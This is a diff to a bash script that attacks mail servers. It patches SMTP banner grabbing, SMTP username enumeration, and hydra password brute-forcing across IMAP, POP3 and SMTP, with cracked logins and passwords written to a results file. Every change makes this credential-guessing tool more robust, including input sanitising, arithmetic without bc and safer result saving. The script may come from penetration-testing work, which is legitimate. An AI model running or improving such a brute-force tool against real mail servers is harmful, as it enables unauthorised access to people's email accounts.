@@ -206,12 +206,12 @@ show_optimization_tips() {
     echo "║   • postmaster@example.com   (RFC standard)"
     echo "║   • abuse@example.com        (RFC standard)"
     echo "║"
-    echo "║ Priority Order (by success rate):"
-    echo "║   1. admin (40% success)"
-    echo "║   2. root (25% success)"
-    echo "║   3. postmaster (20% success)"
-    echo "║   4. user (15% success)"
-    echo "║   5. info (10% success)"
+    echo "║ Priority Order (commonly successful):"
+    echo "║   1. admin (most common)"
+    echo "║   2. root (very common)"
+    echo "║   3. postmaster (RFC-standard account)"
+    echo "║   4. user (generic account)"
+    echo "║   5. info (common service account)"
     echo "║"
     echo "╚════════════════════════════════════════╝"
     echo ""
@@ -399,7 +399,13 @@ smtp_banner_grab() {
     
     log_info "🔍 SMTP Banner Grabbing: $target:$port"
     
-    local banner=$(timeout 10 bash -c "exec 3<>/dev/tcp/$target/$port 2>/dev/null && cat <&3" 2>/dev/null | head -1)
+    # Validate target
+    if [ -z "$target" ]; then
+        log_error "  Invalid target"
+        return 1
+    fi
+    
+    local banner=$(timeout 10 bash -c "exec 3<>/dev/tcp/$target/$port 2>/dev/null && cat <&3 2>/dev/null" 2>/dev/null | head -1)
     
     if [ -n "$banner" ]; then
         log_success "  Banner: $banner"
@@ -485,6 +491,10 @@ smtp_enumerate_users() {
     while read username; do
         [ -z "$username" ] && continue
         [ "$username" = "#"* ] && continue  # Skip comments
+        
+        # Validate and escape username to prevent command injection
+        username=$(echo "$username" | tr -cd '[:alnum:]@._-')
+        [ -z "$username" ] && continue
         
         local response=$(timeout 5 bash -c "
             exec 3<>/dev/tcp/$target/$port 2>/dev/null
@@ -794,8 +804,10 @@ execute_protocol_attack() {
     local output_file="/tmp/hydra_output_$$_${protocol}.tmp"
     local hydra_protocol="${protocol/:*/}"  # Extract protocol name
     
-    # Execute hydra attack
-    start_attack_tracking "$protocol" "$target" "$port" "$(wc -l < "$userfile")" "$(wc -l < "$passfile")"
+    # Execute hydra attack (start_attack_tracking if function exists)
+    if command -v start_attack_tracking &>/dev/null 2>&1; then
+        start_attack_tracking "$protocol" "$target" "$port" "$(wc -l < "$userfile")" "$(wc -l < "$passfile")" 2>/dev/null || true
+    fi
     
     hydra -L "$userfile" -P "$passfile" \
           -t "$threads" \
@@ -820,7 +832,10 @@ execute_protocol_attack() {
             # Save to JSON
             save_result_json "$protocol" "$target" "$port" "$login" "$password"
             
-            finish_attack_tracking "$protocol" "$target" "$port" "SUCCESS" "$login" "$password"
+            # finish_attack_tracking if function exists
+            if command -v finish_attack_tracking &>/dev/null 2>&1; then
+                finish_attack_tracking "$protocol" "$target" "$port" "SUCCESS" "$login" "$password" 2>/dev/null || true
+            fi
             
             rm -f "$output_file"
             return 0
@@ -832,12 +847,16 @@ execute_protocol_attack() {
     # Check output file for any results
     if [ -f "$output_file" ] && grep -q "host:" "$output_file" 2>/dev/null; then
         log_success "Attack completed with results - check output file"
-        finish_attack_tracking "$protocol" "$target" "$port" "SUCCESS"
+        if command -v finish_attack_tracking &>/dev/null 2>&1; then
+            finish_attack_tracking "$protocol" "$target" "$port" "SUCCESS" 2>/dev/null || true
+        fi
         rm -f "$output_file"
         return 0
     else
         log_warning "No credentials found for $protocol"
-        finish_attack_tracking "$protocol" "$target" "$port" "FAILED"
+        if command -v finish_attack_tracking &>/dev/null 2>&1; then
+            finish_attack_tracking "$protocol" "$target" "$port" "FAILED" 2>/dev/null || true
+        fi
         rm -f "$output_file"
         return 1
     fi
@@ -854,28 +873,15 @@ save_result_json() {
     local username="$4"
     local password="$5"
     
-    # Append result to JSON file
+    # Create simple JSON entry and append to results
     local timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)
-    local temp_json="/tmp/email_result_$$.json"
+    local result_entry="{\"timestamp\":\"$timestamp\",\"protocol\":\"$protocol\",\"target\":\"$target\",\"port\":$port,\"username\":\"$username\",\"password\":\"$password\",\"success\":true}"
     
-    cat > "$temp_json" << EOF
-{
-  "timestamp": "$timestamp",
-  "protocol": "$protocol",
-  "target": "$target",
-  "port": $port,
-  "username": "$username",
-  "password": "$password",
-  "success": true
-}
-EOF
+    # Append to a simple JSON lines file for easy parsing
+    local json_lines_file="${RESULTS_JSON%.json}_lines.jsonl"
+    echo "$result_entry" >> "$json_lines_file"
     
-    # Update main results file (simplified, would need proper JSON manipulation)
-    if [ -f "$RESULTS_JSON" ]; then
-        log_success "Result saved to: $RESULTS_JSON"
-    fi
-    
-    rm -f "$temp_json"
+    log_success "Result saved to: $json_lines_file"
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -978,14 +984,18 @@ run_email_attack() {
         local port="${proto_port##*:}"
         
         # Calculate threads and timeout based on protocol and multipliers
+        # Use bash arithmetic to avoid bc dependency
         local threads timeout
+        local thread_mult=$(echo "$THREAD_MULTIPLIER" | awk '{printf "%.0f", $1 * 100}')
+        local timeout_mult=$(echo "$TIMEOUT_MULTIPLIER" | awk '{printf "%.0f", $1 * 100}')
+        
         case "$proto" in
-            imap) threads=$(bc <<< "$IMAP_THREADS * $THREAD_MULTIPLIER" | cut -d. -f1); timeout=$(bc <<< "$IMAP_TIMEOUT * $TIMEOUT_MULTIPLIER" | cut -d. -f1) ;;
-            pop3) threads=$(bc <<< "$POP3_THREADS * $THREAD_MULTIPLIER" | cut -d. -f1); timeout=$(bc <<< "$POP3_TIMEOUT * $TIMEOUT_MULTIPLIER" | cut -d. -f1) ;;
-            smtp) threads=$(bc <<< "$SMTP_THREADS * $THREAD_MULTIPLIER" | cut -d. -f1); timeout=$(bc <<< "$SMTP_TIMEOUT * $TIMEOUT_MULTIPLIER" | cut -d. -f1) ;;
-            imaps) threads=$(bc <<< "$IMAPS_THREADS * $THREAD_MULTIPLIER" | cut -d. -f1); timeout=$(bc <<< "$IMAPS_TIMEOUT * $TIMEOUT_MULTIPLIER" | cut -d. -f1) ;;
-            pop3s) threads=$(bc <<< "$POP3S_THREADS * $THREAD_MULTIPLIER" | cut -d. -f1); timeout=$(bc <<< "$POP3S_TIMEOUT * $TIMEOUT_MULTIPLIER" | cut -d. -f1) ;;
-            smtps) threads=$(bc <<< "$SMTPS_THREADS * $THREAD_MULTIPLIER" | cut -d. -f1); timeout=$(bc <<< "$SMTPS_TIMEOUT * $TIMEOUT_MULTIPLIER" | cut -d. -f1) ;;
+            imap) threads=$(( (IMAP_THREADS * thread_mult) / 100 )); timeout=$(( (IMAP_TIMEOUT * timeout_mult) / 100 )) ;;
+            pop3) threads=$(( (POP3_THREADS * thread_mult) / 100 )); timeout=$(( (POP3_TIMEOUT * timeout_mult) / 100 )) ;;
+            smtp) threads=$(( (SMTP_THREADS * thread_mult) / 100 )); timeout=$(( (SMTP_TIMEOUT * timeout_mult) / 100 )) ;;
+            imaps) threads=$(( (IMAPS_THREADS * thread_mult) / 100 )); timeout=$(( (IMAPS_TIMEOUT * timeout_mult) / 100 )) ;;
+            pop3s) threads=$(( (POP3S_THREADS * thread_mult) / 100 )); timeout=$(( (POP3S_TIMEOUT * timeout_mult) / 100 )) ;;
+            smtps) threads=$(( (SMTPS_THREADS * thread_mult) / 100 )); timeout=$(( (SMTPS_TIMEOUT * timeout_mult) / 100 )) ;;
             *) threads=16; timeout=30 ;;
         esac
         
@@ -1203,7 +1213,7 @@ fi
 
 # Email enumeration if enabled
 if [ "$ENABLE_ENUMERATION" = "true" ]; then
-    local temp_users="/tmp/enum_users_$$.txt"
+    temp_users="/tmp/enum_users_$$.txt"
     get_default_usernames "$temp_users"
     smtp_enumerate_users "$FINAL_TARGET" "$SMTP_PORT" "$temp_users" 2>/dev/null || true
     rm -f "$temp_users"
